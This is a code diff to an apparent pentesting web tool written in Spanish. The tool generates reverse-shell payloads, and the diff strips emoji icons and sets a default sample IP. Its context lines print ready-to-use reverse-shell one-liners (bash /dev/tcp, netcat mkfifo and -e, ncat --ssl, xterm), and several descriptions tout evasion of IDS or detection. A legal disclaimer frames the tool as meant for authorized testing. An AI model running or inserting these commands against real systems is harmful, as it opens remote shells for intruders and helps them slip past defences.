@@ -67,7 +67,6 @@ function sanitizeForShell(input: string): string {
 interface ShellPayload {
     id: string;
     name: string;
-    icon: string;
     category: "linux" | "windows" | "web" | "misc";
     description: string;
     generate: (ip: string, port: string) => string;
@@ -80,7 +79,6 @@ const PAYLOADS: ShellPayload[] = [
     {
         id: "bash-tcp",
         name: "Bash TCP",
-        icon: "🐧",
         category: "linux",
         description: "Shell reversa clásica usando /dev/tcp de Bash",
         generate: (ip, port) => `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
@@ -90,7 +88,6 @@ const PAYLOADS: ShellPayload[] = [
     {
         id: "bash-udp",
         name: "Bash UDP",
-        icon: "🐧",
         category: "linux",
         description: "Shell reversa por UDP usando Bash",
         generate: (ip, port) => `bash -i >& /dev/udp/${ip}/${port} 0>&1`,
@@ -99,7 +96,6 @@ const PAYLOADS: ShellPayload[] = [
     {
         id: "bash-196",
         name: "Bash 196",
-        icon: "🐧",
         category: "linux",
         description: "Variante alternativa que evita detección de /dev/tcp",
         generate: (ip, port) => `0<&196;exec 196<>/dev/tcp/${ip}/${port}; bash <&196 >&196 2>&196`,
@@ -108,7 +104,6 @@ const PAYLOADS: ShellPayload[] = [
     {
         id: "nc-mkfifo",
         name: "Netcat (mkfifo)",
-        icon: "🔌",
         category: "linux",
         description: "Netcat con named pipe — funciona con nc sin -e",
         generate: (ip, port) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc ${ip} ${port} >/tmp/f`,
@@ -117,7 +112,6 @@ const PAYLOADS: ShellPayload[] = [
     {
         id: "nc-e",
         name: "Netcat -e",
-        icon: "🔌",
         category: "linux",
         description: "Netcat clásico con opción -e (requiere nc-traditional)",
         generate: (ip, port) => `nc -e /bin/bash ${ip} ${port}`,
@@ -127,7 +121,6 @@ const PAYLOADS: ShellPayload[] = [
     {
         id: "ncat-ssl",
         name: "Ncat SSL",
-        icon: "🔐",
         category: "linux",
         description: "Conexión cifrada con Ncat (parte de Nmap). Anti-IDS.",
         generate: (ip, port) => `ncat --ssl ${ip} ${port} -e /bin/bash`,
@@ -137,7 +130,6 @@ const PAYLOADS: ShellPayload[] = [
     {
         id: "python3",
         name: "Python 3",
-        icon: "🐍",
         category: "linux",
         description: "Shell reversa interactiva en Python 3",
         generate: (ip, port) =>
@@ -147,7 +139,6 @@ const PAYLOADS: ShellPayload[] = [
     {
         id: "python2",
         name: "Python 2",
-        icon: "🐍",
         category: "linux",
         description: "Shell reversa en Python 2 (sistemas legacy)",
         generate: (ip, port) =>
@@ -157,7 +148,6 @@ const PAYLOADS: ShellPayload[] = [
     {
         id: "perl",
         name: "Perl",
-        icon: "🐪",
         category: "linux",
         description: "Shell reversa en Perl — disponible en muchos sistemas Unix",
         generate: (ip, port) =>
@@ -167,7 +157,6 @@ const PAYLOADS: ShellPayload[] = [
     {
         id: "ruby",
         name: "Ruby",
-        icon: "💎",
         category: "linux",
         description: "Shell reversa en Ruby",
         generate: (ip, port) =>
@@ -177,7 +166,6 @@ const PAYLOADS: ShellPayload[] = [
     {
         id: "socat",
         name: "Socat",
-        icon: "🔗",
         category: "linux",
         description: "Shell interactiva completa con TTY vía socat",
         generate: (ip, port) =>
@@ -189,7 +177,6 @@ const PAYLOADS: ShellPayload[] = [
     {
         id: "awk",
         name: "AWK",
-        icon: "📝",
         category: "linux",
         description: "Using AWK for reverse shell — unusual and stealthy",
         generate: (ip, port) =>
@@ -200,7 +187,6 @@ const PAYLOADS: ShellPayload[] = [
     {
         id: "php-exec",
         name: "PHP exec",
-        icon: "🐘",
         category: "web",
         description: "Shell reversa PHP usando exec() y mkfifo",
         generate: (ip, port) =>
@@ -210,7 +196,6 @@ const PAYLOADS: ShellPayload[] = [
     {
         id: "php-proc",
         name: "PHP proc_open",
-        icon: "🐘",
         category: "web",
         description: "PHP con proc_open para bypass de disable_functions",
         generate: (ip, port) =>
@@ -220,7 +205,6 @@ const PAYLOADS: ShellPayload[] = [
     {
         id: "node-js",
         name: "Node.js",
-        icon: "🟢",
         category: "web",
         description: "Shell reversa con Node.js child_process",
         generate: (ip, port) =>
@@ -231,7 +215,6 @@ const PAYLOADS: ShellPayload[] = [
     {
         id: "powershell",
         name: "PowerShell",
-        icon: "🪟",
         category: "windows",
         description: "Shell reversa clásica en PowerShell",
         generate: (ip, port) =>
@@ -241,7 +224,6 @@ const PAYLOADS: ShellPayload[] = [
     {
         id: "powershell-b64",
         name: "PowerShell Base64",
-        icon: "🪟",
         category: "windows",
         description: "PowerShell con payload codificado en Base64 para evasión",
         generate: (ip, port) => {
@@ -261,7 +243,6 @@ const PAYLOADS: ShellPayload[] = [
     {
         id: "xterm",
         name: "Xterm",
-        icon: "🖥️",
         category: "misc",
         description: "Shell gráfica via X11 forwarding",
         generate: (ip, _port) => `xterm -display ${ip}:1`,
@@ -271,7 +252,6 @@ const PAYLOADS: ShellPayload[] = [
     {
         id: "openssl",
         name: "OpenSSL",
-        icon: "🔐",
         category: "misc",
         description: "Shell reversa cifrada via OpenSSL — evade IDS/IPS",
         generate: (ip, port) =>
@@ -283,15 +263,16 @@ const PAYLOADS: ShellPayload[] = [
 ];
 
 const CATEGORIES = [
-    { id: "linux" as const, name: "Linux/Unix", icon: "🐧" },
-    { id: "windows" as const, name: "Windows", icon: "🪟" },
-    { id: "web" as const, name: "Web/Scripting", icon: "🌐" },
-    { id: "misc" as const, name: "Otros", icon: "🔧" },
+    { id: "linux" as const, name: "Linux/Unix" },
+    { id: "windows" as const, name: "Windows" },
+    { id: "web" as const, name: "Web/Scripting" },
+    { id: "misc" as const, name: "Otros" },
 ];
 
 export default function ReverseShellPage() {
     const { isLoading, isAuthorized, accessType, toolName } = useToolAccess("reverse-shell");
-    const [ip, setIp] = useState("");
+    // IP de ejemplo (la de los laboratorios de práctica): los comandos se ven armados al entrar; se reemplaza al escribir.
+    const [ip, setIp] = useState("10.10.14.5");
     const [port, setPort] = useState("4444");
     const [selectedCategory, setSelectedCategory] = useState<string | null>(null);
     const [copiedId, setCopiedId] = useState<string | null>(null);
@@ -345,7 +326,7 @@ export default function ReverseShellPage() {
                 {/* Legal Disclaimer */}
                 <div className="mb-6 bg-red-500/10 border border-red-500/30 rounded-xl p-4">
                     <p className="text-xs text-red-300">
-                        <strong>⚠️ AVISO LEGAL (NIST SP 800-115):</strong> Esta herramienta es exclusivamente para{" "}
+                        <strong>AVISO LEGAL (NIST SP 800-115):</strong> Esta herramienta es exclusivamente para{" "}
                         <strong>pruebas de seguridad autorizadas</strong> y fines educativos. El uso no autorizado
                         de estas técnicas contra sistemas sin consentimiento explícito es <strong>ilegal</strong> y
                         puede constituir un delito penal. Asegúrate de tener autorización escrita antes de realizar
@@ -437,7 +418,7 @@ export default function ReverseShellPage() {
                                 onClick={() => setSelectedCategory(selectedCategory === cat.id ? null : cat.id)}
                                 className={`px-3 py-1.5 rounded-lg text-sm font-medium transition-all ${selectedCategory === cat.id ? "bg-red-500/20 text-red-300 border border-red-500/30" : "bg-white/5 text-neutral-400 border border-transparent hover:bg-white/10"}`}
                             >
-                                {cat.icon} {cat.name} ({count})
+                                {cat.name} ({count})
                             </button>
                         );
                     })}
@@ -454,7 +435,6 @@ export default function ReverseShellPage() {
                                 <div className="p-4">
                                     <div className="flex items-center justify-between mb-2">
                                         <div className="flex items-center gap-2">
-                                            <span className="text-lg">{payload.icon}</span>
                                             <h3 className="text-sm font-semibold text-white">{payload.name}</h3>
                                         </div>
                                         {isValid && (
@@ -488,7 +468,7 @@ export default function ReverseShellPage() {
                                                             onClick={() => handleCopy(listener, `${payload.id}-listener`)}
                                                             className="text-xs text-neutral-500 hover:text-white transition-colors shrink-0"
                                                         >
-                                                            {copiedId === `${payload.id}-listener` ? "✓" : "📋"}
+                                                            {copiedId === `${payload.id}-listener` ? "✓" : "Copiar"}
                                                         </button>
                                                     </div>
                                                 </div>
@@ -496,7 +476,7 @@ export default function ReverseShellPage() {
 
                                             {payload.notes && (
                                                 <p className="text-[10px] text-neutral-500 mt-2 italic">
-                                                    💡 {payload.notes}
+                                                    {payload.notes}
                                                 </p>
                                             )}
                                         </>
@@ -521,7 +501,7 @@ export default function ReverseShellPage() {
 
                 {/* Stabilize Shell Tips */}
                 <div className="mt-8 bg-white/5 rounded-xl p-4 border border-white/10">
-                    <h3 className="text-sm font-semibold text-white mb-3">🔧 Estabilizar la Shell</h3>
+                    <h3 className="text-sm font-semibold text-white mb-3">Estabilizar la Shell</h3>
                     <div className="space-y-2 text-xs text-neutral-400 font-mono">
                         <div className="bg-[#0F1724] rounded-lg p-3">
                             <p className="text-neutral-500 mb-1"># Paso 1: Spawnar TTY con Python</p>
@@ -540,7 +520,7 @@ export default function ReverseShellPage() {
 
                 {/* MITRE ATT&CK Reference */}
                 <div className="mt-4 bg-white/5 rounded-xl p-4 border border-white/10">
-                    <h3 className="text-sm font-semibold text-white mb-2">📚 Referencias MITRE ATT&CK</h3>
+                    <h3 className="text-sm font-semibold text-white mb-2">Referencias MITRE ATT&CK</h3>
                     <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 text-xs text-neutral-400">
                         <div className="p-2 bg-white/5 rounded-lg">
                             <strong className="text-white">T1059</strong> — Command and Scripting Interpreter
@@ -560,7 +540,7 @@ export default function ReverseShellPage() {
                 {/* Security Notice */}
                 <div className="mt-4 bg-red-500/10 border border-red-500/30 rounded-xl p-3">
                     <p className="text-xs text-red-300">
-                        <strong>🛡️ Seguridad (NIST SP 800-115 / OWASP):</strong> Los payloads se generan
+                        <strong>Seguridad (NIST SP 800-115 / OWASP):</strong> Los payloads se generan
                         localmente en tu navegador. No se realizan conexiones de red. Los inputs se validan
                         y sanitizan estrictamente. Solo usar en entornos con autorización escrita.
                     </p>
